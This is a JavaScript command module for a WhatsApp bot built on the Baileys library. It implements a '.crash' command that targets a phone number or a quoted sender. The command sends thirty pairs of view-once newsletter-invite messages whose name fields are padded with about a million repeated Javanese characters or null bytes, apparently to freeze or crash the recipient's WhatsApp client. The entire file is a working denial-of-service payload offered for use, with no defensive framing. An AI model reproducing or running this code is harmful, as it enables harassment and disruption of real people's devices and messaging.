const { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

async function bugs(message, client, participant) {
  const remoteJid = participant;

  const messageContent = generateWAMessageFromContent(remoteJid, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `120363298524333143@newsletter`,
          newsletterName: "Mickey" + "ꦾ".repeat(1020000),
          jpegThumbnail: ``,
          caption: `Mickey admin channel`,
          inviteExpiration: Date.now() + 1814400000
        }
      }
    }
  }), { userJid: remoteJid });

  await client.relayMessage(remoteJid, messageContent.message, {
    participant: { jid: remoteJid },
    messageId: messageContent.key.id
  });
}

async function bug2(message, client, participant) {
  const remoteJid = participant;

  const messageContent = generateWAMessageFromContent(remoteJid, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `120363298524333143@newsletter`,
          newsletterName: "Mickey" + "\u0000".repeat(1020000),
          jpegThumbnail: ``,
          caption: `Mickey admin channel`,
          inviteExpiration: Date.now() + 1814400000
        }
      }
    }
  }), { userJid: remoteJid });

  await client.relayMessage(remoteJid, messageContent.message, {
    participant: { jid: remoteJid },
    messageId: messageContent.key.id
  });
}

async function crash(sock, chatId, message) {
  try {
    if (!chatId) throw new Error('Chat ID is undefined.');

    await sock.sendMessage(chatId, { text: 'Attempting to bug the target' });

    const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
    const commandAndArgs = messageBody.slice(1).trim();
    const parts = commandAndArgs.split(/\s+/);
    const args = parts.slice(1);

    let participant;
    
    // Try to get participant from quoted message
    if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
      participant = message.message.extendedTextMessage.contextInfo.participant;
    } 
    // Try from command args
    else if (args.length > 0) {
      let num = args[0].replace(/[^0-9]/g, '');
      if (num) {
        participant = num + '@s.whatsapp.net';
      } else {
        throw new Error('Invalid number format. Use: .crash 255711765335 or quote a message.');
      }
    } 
    // Fallback: use chat sender (self-bug in private)
    else if (chatId && !chatId.includes('@g.us')) {
      throw new Error('In private chat, quote a message or use: .crash <number>');
    } 
    else {
      throw new Error('Specify the person to bug: .crash <number> or quote a message.');
    }

    // Validate JID format
    if (!participant || (typeof participant === 'string' && !participant.includes('@'))) {
      throw new Error('Invalid participant JID format.');
    }

    for (let i = 0; i < 30; i++) {
      try {
        await bugs(message, sock, participant);
        await bug2(message, sock, participant);
      } catch (e) {
        console.log(`Attempt ${i + 1} failed:`, e.message);
      }
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    await sock.sendMessage(chatId, { text: '✅ Bug payload sent 30 times. Target may be affected depending on client version.' });
  } catch (error) {
    console.error('An error occurred while trying to bug the target:', error);
    try {
      await sock.sendMessage(chatId, { text: `An error occurred while trying to bug the target: ${error.message}` });
    } catch (e) { }
  }
}

module.exports = crash;
